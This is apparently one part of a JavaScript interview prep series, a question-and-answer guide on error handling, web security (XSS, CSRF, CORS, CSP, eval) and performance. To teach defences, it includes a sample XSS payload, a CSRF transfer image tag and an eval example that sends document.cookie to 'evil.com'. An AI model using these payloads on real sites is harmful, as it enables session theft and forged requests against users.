# JavaScript Interview Prep — Phase 8 – Error Handling, Security & Web Performance

**Part 8 of 10** in the phase-wise JS interview prep series. Questions and phase numbers match `javascript_interview_questions_6yrs_phase_wise.md` exactly.

**All 10 files in this series:**

1. [Phase 1 – JavaScript Fundamentals & Execution Basics](./JS-Interview-Phase-01-Fundamentals.md)
2. [Phase 2 – Functions, Scope, Closures & `this`](./JS-Interview-Phase-02-Functions-Scope-Closures-This.md)
3. [Phase 3 – Objects, Prototypes & Object APIs](./JS-Interview-Phase-03-Objects-Prototypes.md)
4. [Phase 4 – Arrays, Strings, Maps, Sets & Data Handling](./JS-Interview-Phase-04-Arrays-Strings-Maps-Sets.md)
5. [Phase 5 – Asynchronous JavaScript & Event Loop](./JS-Interview-Phase-05-Async-EventLoop.md)
6. [Phase 6 – Browser APIs, DOM, BOM & Storage](./JS-Interview-Phase-06-Browser-DOM-BOM-Storage.md)
7. [Phase 7 – ES6+ and Modern JavaScript Features](./JS-Interview-Phase-07-ES6-Modern-Features.md)
8. [Phase 8 – Error Handling, Security & Web Performance](./JS-Interview-Phase-08-Error-Handling-Security-Performance.md)
9. [Phase 9 – Advanced JavaScript Output-based Questions](./JS-Interview-Phase-09-Output-Based-Questions.md)
10. [Phase 10 – Senior Frontend JavaScript System-level Questions](./JS-Interview-Phase-10-Senior-System-Level.md)

---

**Goal:** Prepare senior-level frontend questions beyond syntax.

### Q171. What is error handling in JavaScript?

**A:** Catching and responding to runtime failures gracefully instead of letting them crash the program — primarily via `try/catch/finally` for synchronous code and `.catch()`/`try+await` for async code.

```javascript
try {
  JSON.parse("invalid json");
} catch (err) {
  console.error("Parse failed:", err.message);
} finally {
  console.log("Runs regardless of success or failure");
}
```

**Trap:** `try/catch` only catches synchronous errors thrown *within* the try block — an error thrown inside a `setTimeout` callback or unhandled Promise won't be caught by a surrounding `try/catch` (see Q175-177).

### Q172. What is the difference between `throw`, `try`, `catch`, and `finally`?

**A:**

```javascript
function divide(a, b) {
  if (b === 0) throw new Error("Cannot divide by zero"); // throw - raises an error
  return a / b;
}

try {
  // try - code that might fail
  console.log(divide(10, 0));
} catch (err) {
  // catch - handles the thrown error
  console.error(err.message);
} finally {
  // finally - ALWAYS runs, success or failure
  console.log("Cleanup");
}
```

**Trap:** `finally` runs even if `try` or `catch` contains a `return` statement — and a `return` inside `finally` will override any earlier `return`, a rarely-needed but real gotcha.

### Q173. What is a custom error?

**A:** A class extending the built-in `Error`, adding your own properties/name — lets calling code distinguish error types with `instanceof` instead of parsing message strings.

```javascript
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = "ValidationError";
    this.field = field;
  }
}

try {
  throw new ValidationError("Age must be positive", "age");
} catch (err) {
  if (err instanceof ValidationError) {
    console.log(`Field ${err.field}: ${err.message}`);
  }
}
```

**Trap:** Always call `super(message)` first inside the constructor — skipping it means `this.message` never gets set correctly, and `this` isn't valid until `super()` runs anyway (same rule as any class extending another).

### Q174. What is the difference between syntax error, reference error, and type error?

**A:**

```javascript
// SyntaxError - malformed code, caught at PARSE time, before anything runs
// const x = ;                 // SyntaxError

// ReferenceError - accessing a variable that doesn't exist / isn't in scope
console.log(undeclaredVar); // ReferenceError: undeclaredVar is not defined

// TypeError - operation on the wrong type (e.g., calling a non-function)
const num = 5;
num(); // TypeError: num is not a function
null.property; // TypeError: Cannot read properties of null
```

**Trap:** A `SyntaxError` can NEVER be caught by `try/catch` if it's in the same file being parsed — the whole script fails to parse before any code (including the `try` block) can execute. It's only catchable if the invalid syntax is being parsed dynamically (e.g., inside `eval()` or `JSON.parse()`).

### Q175. How do you handle global JavaScript errors? *(new)*

**A:** `window.addEventListener('error', ...)` catches uncaught synchronous errors anywhere in the page; `unhandledrejection` (Q177) separately catches unhandled Promise rejections.

```javascript
window.addEventListener("error", (event) => {
  console.error("Global error:", event.message, event.filename, event.lineno);
  // report to a monitoring service (Sentry, etc.)
  event.preventDefault(); // prevents default browser logging, optional
});

// In Node.js:
process.on("uncaughtException", (err) => {
  console.error("Uncaught:", err);
});
```

**Trap:** This is a last-resort safety net for logging/monitoring, not a substitute for proper `try/catch` — by the time a global handler fires, the app is often already in a broken state.

### Q176. What is `window.onerror`? *(new)*

**A:** The older, single-handler way to catch global errors (predates `addEventListener('error', ...)`) — takes a callback with positional arguments instead of an event object.

```javascript
window.onerror = function (message, source, lineno, colno, error) {
  console.error(`${message} at ${source}:${lineno}:${colno}`);
  return true; // returning true suppresses the default browser console error
};
```

**Trap:** `window.onerror` can only have **one** handler at a time (assigning a new one overwrites the old) — `window.addEventListener('error', ...)` (Q175) allows multiple independent handlers and is the modern preference.

### Q177. What is unhandled promise rejection? *(new)*

**A:** When a Promise rejects and no `.catch()` (or `try/catch` around an `await`) ever handles it — the browser fires an `unhandledrejection` event, and logs a warning to the console.

```javascript
Promise.reject(new Error("oops")); // never caught anywhere - triggers a warning

window.addEventListener("unhandledrejection", (event) => {
  console.error("Unhandled rejection:", event.reason);
  event.preventDefault(); // suppress the default browser warning, if desired
});
```

**Trap:** Unlike a thrown synchronous error, an unhandled rejection does NOT crash the program or stop execution — it fails silently unless you're specifically listening for it, making it an easy category of bug to miss entirely in testing.

### Q178. How do you handle API failures gracefully?

**A:** Check HTTP status (`fetch` doesn't reject on 404/500), provide user-facing fallback UI, and consider retry logic for transient failures.

```javascript
async function fetchWithFallback(url) {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  } catch (err) {
    console.error("API failed:", err.message);
    return { error: true, fallbackData: [] }; // graceful degradation
  }
}
```

**Trap:** Remember `fetch()` only rejects on network-level failures (DNS, offline, CORS) — a 404 or 500 response is still a "successful" fetch as far as the Promise is concerned; you must check `res.ok` yourself.

### Q179. What is XSS? *(new)*

**A:** Cross-Site Scripting — an attack where malicious JS gets injected into a page (via unsanitized user input) and executes in the context of a trusted site, able to steal cookies, session tokens, or manipulate the page.

```javascript
// Vulnerable: directly injecting untrusted input as HTML
element.innerHTML = userInput; // if userInput = "<img src=x onerror=alert(1)>", it EXECUTES

// If that page also relies on non-HttpOnly cookies for auth, XSS can steal them:
// document.cookie is readable by any script running on the page, including injected ones
```

**Trap:** XSS isn't just an "alert box" party trick in interviews — the real danger is that injected script runs with full access to the page's DOM and any readable cookies/localStorage, enabling session hijacking.

### Q180. How can JavaScript code prevent XSS? *(new)*

**A:** Never inject untrusted input as raw HTML; sanitize/escape it, prefer `textContent` over `innerHTML`, and use a Content Security Policy (Q183) as defense in depth.

```javascript
// Safe: textContent never interprets the string as HTML
element.textContent = userInput; // <img src=x onerror=...> renders as literal text, doesn't execute

// If you MUST render HTML from user input, sanitize it first:
// import DOMPurify from 'dompurify';
// element.innerHTML = DOMPurify.sanitize(userInput);

// React/Vue/etc. escape by default - this is why {variable} in JSX is safe,
// and dangerouslySetInnerHTML is named that way on purpose
```

**Trap:** Modern frameworks (React, Vue, Angular) escape content by default, which is exactly why bypassing that safety (`dangerouslySetInnerHTML`, `v-html`, raw `innerHTML`) should be treated as a deliberate, reviewed decision, not a casual convenience.

### Q181. What is CSRF? *(new)*

**A:** Cross-Site Request Forgery — an attack tricking a logged-in user's browser into making an unwanted request to a site they're authenticated on, exploiting the fact that cookies are sent automatically with every request (Q133).

```html
<!-- On a malicious site, while you're logged into bank.com in another tab: -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- Your browser automatically attaches your bank.com session cookie to this request! -->
```

**Trap:** CSRF exploits *cookies being sent automatically*, so it primarily targets cookie-based auth (not `localStorage`-based tokens, which JS on the attacker's page can't read due to same-origin policy). Defenses: CSRF tokens, `SameSite` cookie attribute (Q135), and checking the `Origin`/`Referer` header server-side.

### Q182. What is CORS security?

**A:** CORS is fundamentally a security mechanism — the browser's way of enforcing that a server has explicitly opted in to letting other origins read its responses, preventing malicious sites from silently reading your authenticated data from another domain.

```javascript
// Server response headers control the policy:
// Access-Control-Allow-Origin: https://trusted-app.com  (specific origin)
// Access-Control-Allow-Credentials: true                 (allow cookies cross-origin)

// Wildcard * CANNOT be combined with credentials: true - the browser blocks it,
// since that combination would defeat the entire purpose of the restriction
```

**Trap:** CORS protects the *response* from being read by unauthorized JS — it does NOT prevent the request itself from happening or the server from processing it, which is why CSRF (Q181) is a separate, still-relevant threat even with CORS configured correctly.

### Q183. What is Content Security Policy? *(new)*

**A:** An HTTP response header that restricts what sources a page is allowed to load scripts, styles, images, etc. from — a strong defense-in-depth layer against XSS, even if an injection point exists.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'
```

```javascript
// With a strict CSP in place, even successfully injected inline scripts often
// won't execute at all, because inline <script> and eval() are blocked by default
// unless the policy explicitly allows 'unsafe-inline' / 'unsafe-eval'
```

**Trap:** A strict CSP by default blocks inline `<script>` tags, inline event handlers (`onclick="..."`), and `eval()` — a huge amount of legacy code silently breaks under a naively "strict" CSP, so it usually needs careful, incremental rollout.

### Q184. Why is `eval()` dangerous? *(new)*

**A:** `eval()` executes an arbitrary string as JavaScript with full access to the surrounding scope — if that string ever contains (or is influenced by) untrusted input, it's a direct code-execution vulnerability, not just a "bad practice."

```javascript
function calculate(expression) {
  return eval(expression); // if expression = "fetch('evil.com?cookie='+document.cookie)"...
}
// eval() also defeats most JS engine optimizations - the engine can't safely
// optimize code around an eval() call, since it might redefine anything

// Nearly always avoidable:
JSON.parse(jsonString); // instead of eval() for parsing JSON
new Function("a", "b", "return a + b"); // still risky, but more contained than eval()
```

**Trap:** Even indirect forms (`setTimeout("someCode()", 1000)` with a string, or `new Function(...)`) carry the same fundamental risk as `eval()` — always prefer passing an actual function reference, not a string to be parsed as code.

### Q185. What are memory leaks in JavaScript?

**A:** Memory that's no longer needed but never gets garbage collected, because something still holds a reference to it — the app's memory usage grows over time and never comes back down.

```javascript
let detachedNodes = [];
function leak() {
  const el = document.createElement("div");
  document.body.appendChild(el);
  document.body.removeChild(el); // removed from the page...
  detachedNodes.push(el); // ...but still referenced here, so NOT garbage collected
}
```

**Trap:** JS's garbage collector only frees memory that's truly *unreachable* — it can't tell the difference between "this reference is intentional" and "this reference was forgotten," which is exactly why leaks happen despite automatic GC.

### Q186. What causes memory leaks in frontend applications?

**A:**

```javascript
// 1. Forgotten event listeners on removed elements
element.addEventListener("click", handler);
element.remove(); // handler still referenced by the DOM node internally in some cases

// 2. Uncleared timers/intervals holding closures
setInterval(() => useSomeLargeObject(), 1000); // never cleared = large object never freed

// 3. Closures capturing large objects unnecessarily
function setup() {
  const bigData = new Array(1000000).fill("x");
  return () => console.log(bigData.length); // bigData stays alive as long as this fn does
}

// 4. Global variables that accumulate (e.g. an ever-growing cache/array)
window.cache = window.cache || [];
```

**Trap:** In React specifically, the single most common leak is a `useEffect` that adds a listener/subscription/timer without a cleanup function in its return — every mount leaks a bit more.

### Q187. How do you detect memory leaks in the browser? *(new)*

**A:** Chrome DevTools' **Memory** tab: take heap snapshots at different points, compare them, and look for objects/detached DOM nodes whose count keeps growing across repeated actions that should be memory-neutral.

```
1. Open DevTools -> Memory tab -> "Heap snapshot"
2. Perform an action that should NOT leak memory (open/close a modal, navigate away and back)
3. Take another snapshot, repeat the action several times, take a third
4. Compare snapshots - look for "Detached" DOM nodes and growing object counts
5. The "Allocation instrumentation on timeline" view shows exactly WHEN allocations happen
```

```javascript
// "Detached HTMLDivElement" in a heap snapshot means: removed from the page,
// but something in JS still holds a reference - exactly the leak pattern from Q185
```

**Trap:** A single heap snapshot tells you very little — leaks are only visible by comparing snapshots *across repeated actions*; a one-time snapshot just shows normal memory usage.

### Q188. What is garbage collection?

**A:** The JS engine's automatic process of freeing memory occupied by objects that are no longer reachable from any root reference (global scope, active call stack). Modern engines use a **mark-and-sweep** algorithm.

```javascript
let obj = { data: "large" }; // reachable, kept alive
obj = null; // no more references - eligible for GC, will be freed eventually

function create() {
  const local = { data: "temp" }; // reachable during the call
  return local.data;
} // after the function returns, `local` becomes unreachable - GC'd
create();
```

**Trap:** GC timing is non-deterministic — you cannot force immediate collection or predict exactly when it runs (there's no reliable `delete this object now`), which is why leak prevention (avoiding unnecessary references) matters more than trying to trigger cleanup manually.

### Q189. What are strong and weak references? *(new)*

**A:** A strong reference (the normal kind — a variable, object property, array element) keeps its target alive, preventing garbage collection. A weak reference (via `WeakMap`/`WeakSet`, or `WeakRef`) does NOT keep its target alive — the object can still be collected even while weakly referenced.

```javascript
let obj = { data: "value" };
const strongRefArray = [obj]; // strong reference - obj stays alive even if we do obj = null

const wm = new WeakMap();
wm.set(obj, "metadata"); // weak reference - does NOT prevent GC
obj = null; // now eligible for GC despite still being "in" the WeakMap
```

**Trap:** `WeakRef` (ES2021) lets you hold a weak reference to any single object directly (`new WeakRef(obj)`), but it's a specialized, rarely-needed API — `WeakMap`/`WeakSet` cover the vast majority of real use cases.

### Q190. How do WeakMap and WeakSet help garbage collection?

**A:** By not counting as a "real" reference — an object stored only as a `WeakMap`/`WeakSet` entry can still be garbage collected once nothing else references it, automatically cleaning up the entry too.

```javascript
const cache = new WeakMap();

function processElement(el) {
  if (cache.has(el)) return cache.get(el);
  const result = expensiveComputation(el);
  cache.set(el, result); // cached, but doesn't keep `el` alive artificially
  return result;
}
// If `el` (a DOM node) is later removed from the page and has no other references,
// it AND its cache entry are both garbage collected together - no manual cleanup needed
```

**Trap:** This is precisely why `WeakMap` is the right tool for "attach metadata to an object without affecting its lifecycle" — a regular `Map` used the same way would leak, since the Map itself would keep every key alive forever.

### Q191. What is tree shaking?

**A:** A build-time optimization (via bundlers like Webpack, Rollup, Vite) that removes unused exports from the final bundle — relies on ES module `import`/`export`'s static, analyzable structure.

```javascript
// utils.js
export function used() {} // included in the bundle
export function unused() {} // eliminated by tree shaking - never imported anywhere

// app.js
import { used } from "./utils.js"; // only `used` is imported
```

**Trap:** Tree shaking requires **ES modules** specifically — CommonJS (`require`/`module.exports`) is dynamic and not statically analyzable, so bundlers generally can't tree-shake it effectively.

### Q192. What is code splitting? *(new)*

**A:** Breaking a bundle into multiple smaller chunks that load on demand, instead of one giant file loaded upfront — reduces initial load time by only downloading what's needed for the current view.

```javascript
// Route-based splitting (React example)
const Dashboard = React.lazy(() => import("./Dashboard")); // separate chunk, loaded on demand

// Manual splitting via dynamic import
if (userNeedsChart) {
  const { renderChart } = await import("./chartLibrary.js");
  renderChart();
}
```

**Trap:** Code splitting shifts cost from "slow initial load" to "brief loading state when navigating to a new chunk" — it's a trade-off, not a free win, and needs proper loading states (`<Suspense>` in React) to avoid a jarring UX.

### Q193. What is lazy loading? *(new)*

**A:** Deferring the loading of a resource (component, image, module) until it's actually needed — a broader concept that code splitting (Q192) is one specific application of.

```javascript
// Lazy-loading a component (uses code splitting under the hood)
const Modal = React.lazy(() => import("./Modal"));

// Lazy-loading images natively (no JS needed)
// <img src="photo.jpg" loading="lazy" />

// Lazy-loading via IntersectionObserver (older browsers / more control)
const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
      entry.target.src = entry.target.dataset.src;
      observer.unobserve(entry.target);
    }
  });
});
```

**Trap:** Native `loading="lazy"` on `<img>` has broad browser support now and requires zero JS — reaching for a heavier `IntersectionObserver`-based library first (without checking if the native attribute suffices) is a common case of over-engineering.

### Q194. What is debouncing used for in performance optimization?

**A:** Limiting how often an expensive operation runs by waiting for a pause in rapid-fire events — search-as-you-type, resize-triggered re-layout, and auto-save are the classic cases.

```javascript
function debounce(fn, delay) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), delay);
  };
}

const debouncedSearch = debounce((query) => {
  fetch(`/api/search?q=${query}`); // only fires after typing pauses
}, 300);
input.addEventListener("input", (e) => debouncedSearch(e.target.value));
```

**Trap:** Without debouncing, a search-as-you-type field fires one API call *per keystroke* — a very concrete, quantifiable performance/cost problem worth stating explicitly in an interview, not just "it's more efficient."

### Q195. What is throttling used for in performance optimization?

**A:** Guaranteeing an expensive operation runs at most once per fixed interval, even while the triggering event fires continuously — scroll position tracking, infinite-scroll loading, and mousemove-driven UI are classic cases.

```javascript
function throttle(fn, limit) {
  let inThrottle = false;
  return (...args) => {
    if (!inThrottle) {
      fn(...args);
      inThrottle = true;
      setTimeout(() => (inThrottle = false), limit);
    }
  };
}

const throttledScroll = throttle(() => {
  console.log("Scroll position:", window.scrollY); // runs at most once per 200ms
}, 200);
window.addEventListener("scroll", throttledScroll);
```

**Trap:** Debounce vs. throttle mix-ups are common — the deciding question is "do I want to react only once activity STOPS (debounce), or PERIODICALLY while it's still happening (throttle)?"

---

---

## Suggested Preparation Order

1. **Day 1–3:** Phase 1 and Phase 2
2. **Day 4–6:** Phase 3 and Phase 4
3. **Day 7–10:** Phase 5 deeply with code examples
4. **Day 11–13:** Phase 6 and browser APIs
5. **Day 14–16:** Phase 7 modern JS
6. **Day 17–19:** Phase 8 performance/security
7. **Day 20–23:** Phase 9 output-based questions
8. **Day 24–30:** Phase 10 senior-level implementation and architecture questions

---

## High Priority for 6 Years Frontend Engineer

Focus extra on:

- Closures
- Hoisting
- Event loop
- Promises
- Async/await
- `this`, call, apply, bind
- Prototype and inheritance
- Debounce/throttle
- Shallow vs deep copy
- Memory leaks
- Browser storage
- Event delegation
- Web Workers
- JavaScript performance
- Output-based tricky questions
- Polyfills and custom implementations
